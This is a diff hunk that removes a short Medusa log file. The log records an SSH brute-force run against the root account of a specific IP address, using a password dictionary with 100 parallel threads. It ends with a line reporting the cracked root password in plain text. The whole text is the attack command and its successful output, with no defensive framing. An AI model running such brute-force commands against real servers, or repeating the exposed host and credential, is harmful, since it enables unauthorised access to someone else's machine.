@@ -1,4 +1,0 @@
-# Medusa v.2.2 (2018-04-10 17:10:29)
-# medusa -h 134.96.111.196 -u root -P /root/web/uploads/dic/2018/03/pass.txt -M ssh -t 100 -O brute_log/010cc032-3c9f-11e8-8cd6-080027909a35 -F 
-ACCOUNT FOUND: [ssh] Host: 134.96.111.196 User: root Password: admin2017 [SUCCESS]
-# Medusa has finished (2018-04-10 17:10:38).
